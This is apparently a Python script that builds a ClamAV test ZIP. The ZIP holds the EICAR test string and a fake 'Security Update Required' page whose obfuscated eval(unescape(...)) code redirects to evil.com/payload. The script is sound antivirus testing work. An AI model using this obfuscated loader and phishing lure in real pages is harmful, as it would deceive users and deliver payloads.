import zipfile
import os

# [ClamAV 테스트용 여덟 번째 감염 파일 생성 스크립트]
# 이번에는 웹 기반 피싱이나 악성 스크립트 유포 시 자주 사용되는 
# '난독화된 HTML/자바스크립트' 패턴을 테스트합니다.

# 1. 100% 탐지 보장을 위한 EICAR 표준 테스트 서명
EICAR_SIG = r'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'

# 2. 난독화된 자바스크립트 패턴 (피싱/익스플로잇 키트 모사)
# - eval(unescape(...)): 문자열을 해독한 뒤 코드로 실행하는 기법입니다.
# - 백신은 정적 분석에서 의미를 알 수 없는 긴 16진수 문자열 등이 eval 안에 들어있으면 매우 의심스럽게 봅니다.
HTML_JS_SUSPICIOUS = r'''
<!DOCTYPE html>
<html>
<head>
    <title>Security Update Required</title>
</head>
<body>
    <h1>Critical Update Needed</h1>
    <p>Please wait while the security module loads...</p>
    <script>
        /* [HEURISTIC] 난독화된 다운로더 코드 모사 */
        /* 아래 문자열은 실제 악성 코드가 아니지만, 백신의 난독화 분석 엔진을 자극합니다. */
        var _v = "%61%6C%65%72%74%28%27%53%65%63%75%72%69%74%79%20%54%65%73%74%27%29%3B%20%77%69%6E%64%6F%77%2E%6C%6F%63%61%74%69%6F%6E%3D%27%68%74%74%70%3A%2F%2F%65%76%69%6C%2E%63%6F%6D%2F%70%61%79%6C%6F%61%64%27%3B";
        eval(unescape(_v));
    </script>
</body>
</html>
'''

def create_clamav_test08_zip():
    """
    난독화된 HTML/JS 스크립트와 표준 서명을 포함한 ZIP 파일을 생성합니다.
    스크립트 파일명과 ZIP 파일명을 일치시킵니다.
    """
    try:
        # 파일명 자동 매칭
        script_name = os.path.basename(__file__)
        zip_filename = script_name.replace(".py", ".zip")
        
        current_dir = os.path.dirname(os.path.abspath(__file__))
        zip_filepath = os.path.join(current_dir, zip_filename)

        with zipfile.ZipFile(zip_filepath, 'w', zipfile.ZIP_DEFLATED) as zipf:
            # 보증서: 무조건 탐지되는 EICAR 시그니처 파일
            zipf.writestr("signature/eicar_test.txt", EICAR_SIG.encode('ascii'))
            
            # 행위: 난독화된 HTML/JS 피싱 페이지 모사
            zipf.writestr("webroot/index.html", HTML_JS_SUSPICIOUS.encode('utf-8'))
            
        print(f"✅ 생성 완료: {zip_filepath}")
        print(f"📦 생성된 ZIP: {zip_filename}")
        print("💡 탐지 포인트: Obfuscated HTML/JS (eval-unescape) + EICAR 서명 복합")
        
    except Exception as e:
        print(f"❌ 오류 발생: {e}")

if __name__ == "__main__":
    create_clamav_test08_zip()
